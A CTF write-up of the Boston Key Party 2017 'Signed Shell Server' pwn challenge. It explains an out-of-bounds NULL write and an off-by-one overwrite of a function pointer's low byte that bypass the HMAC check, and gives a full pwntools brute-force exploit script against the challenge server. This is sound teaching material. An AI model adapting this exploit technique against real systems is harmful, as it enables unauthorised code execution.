---
layout: post
title: "Boston Key Party CTf 2017: Signed Shell Server (pwn 200)"
author: f0rki, creed
categories: writeup
tags: [cat/pwn]
---

* **Category:** pwn
* **Points:** 200

## Write-up

You can do two things:

1. Sign a command
2. Execute a signed command

```
Welcome to Secure Signed Shell
1) sign command
2) execute command
>_ 1
what command do you want to sign?
>_ ls
signature:
0fcc9e22ff4cec3f5afbaf5906dba086
```

So we can see that the challenge signs with md5 by default!

## out-of-bounds NULL byte write -- force switch to sha1 

They use a HMAC based on md5 or sha1 depending on a global flag (set based on
argc). We call this `use_md5`. This is a byte sized varialbe that is placed
right behind the `global` buffer, which has size `0x100`. We can overwrite the
`use_md5` flag with a zero byte with the calls:

```
i = read(global, 0x100, 0); // send exactly 255 bytes
global[i] = 0;              // out of bounds write to the use_md5 flag
```

This snippet of code is repeated in both the `sign_it` and `execute_it`
functions.

## overwrite least significant byte of a function pointer

There is a off-by-one error, which allows us to overwrite the last byte of the
first function pointer. We are targeting the `deny_ptr` in this struct:

```
struct exec_guy {
    char hash[20];
    void (*deny_ptr)(char*);
    void (*success_ptr)(char*);
}
```

At the start of the `execute_it` function, `exec_guy` will be set to either
`m_exec_guy` or `s_exec_guy` depending on whether md5 or sha1 is used. If the
`use_md5` flag is true, the `exec_guy` is set to 
`s_exec_guy + 1 == m_exec_guy`. If we switch to using SHA1 afterwards, the HMAC
is copied to `exec_guy`, which is actually `s_exec_guy + 1`. So there is one
byte too less available for a full SHA1 HMAC and it will overflow into the
first byte of the `deny_ptr` field.

Since we're on little endian, this means we can control the least significant
byte of the function pointer. If we change the `deny_ptr` to the `success_ptr`
we effectively bypass the signature check.

```
[0x004010a0]> afl~command
0x00400d36    1 0    -> 37   sym.deny_command
0x00400d5b    1 0    -> 27   sym.exec_command
```

So we have to find a HMAC, whose last byte is `0x5b`. So first we checked
whether one of the HMACs we could legitimately obtain would fit our purposes.
We can do this by switching to SHA1 with an overlong command in the `sign_it`
function and then obtain the HMACs:

```
[*] 'ls' -> '4b0eef0a2c6a48fd0f52460231fe61bbfa8f314c' --> 0x400d4c     <-- printf something
[*] 'pwd' -> 'bf34cf2a14f5bbde6c75da9c6ba421fd57772d68' --> 0x400d68    <-- this jumps inside the right function at least, but seems to break
[*] 'id' -> 'e1b428253b9c847348c522e27d00a151f7db9458' --> 0x400d58     <-- nop; leave;ret
[*] 'whoami' -> 'ce6bd6b5229cf202a96ece2b36763e1adec566d1' --> 0x400dd1 <-- somewhere inside init_key
```

So none of those did work out in the end. The `pwd` HMAC looked pretty
promising as it triggers a jump into the `exec_command` function. But then crap
is loaded into the registers and it fails.

To use one of these commands we need to still send an overlong line, with
contents are not hashed. The HMAC covers only up to the first NULL byte, so we
can send for example:

```python
"ls\n" + "\x00" * 253
```

This allows us to trigger the overflow, with a known HMAC.

## exploit recap

0. Call `execute_it`
1. First `exec_guy` is set to `m_exec_guy`, because `use_md5` is true.
2. Use off-by-one error to overwrite the `use_md5` flag with 0, so that SHA1 
   will be used. `exec_guy` is still set to `m_exec_guy`.
3. `memcpy` call at `0x00401261` will then overwrite the least significant 
   byte of the first function pointer.
    - The `src` of `memcpy` is the computed SHA1 HMAC
    - We need to find a HMAC which ends in `0x5b`
4. The function pointers are always loaded relative to the `m_exec_guy` so we 
   can use them safely even if we switched to SHA1
5. shell? shell! (or just cat flag)

In the end we just opted to bruteforce, until we hit a byte that worked. We
tried with a bunch of commands:

```
cat flag; echo <random stuff>
```

Eventually we got a working byte and the flag.

```python
from pwn import *  # noqa
import string
import random 

velf = ELF("./sss")
# this is the byte we'd need...
last_byte = velf.symbols['exec_command'] & 0xff
log.info("last byte of exec_command 0x{:x}".format(last_byte))

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libcrypto.so.1.0.0")}

def make_vp():
    #return process("./sss_dealarmed", env=env)
    return remote("54.202.7.144", 9875)

# less verbosity for pwntools
context.log_level = "error"
while True:
    cmd = "cat flag; echo " + "".join(random.sample(string.letters, 5))
    vp = make_vp()
    # gdb.attach(vp, gdbscript)

    try:
        # now overflow into the use_md5 flag
        # which triggers a buffer overflow into the fptr
        vp.recvuntil(">_")
        vp.sendline("2")
        vp.recvuntil(">_")
        c = "{}\n\x00".format(cmd)
        c += "\x00" * (256 - len(c))
        vp.send(c)
        vp.recvuntil(">_")
        vp.sendline("wurscht")
        line = vp.recvrepeat(timeout=0.5)
        log.info("got line: " + repr(line))

    except:
        pass
    
    vp.close()
```
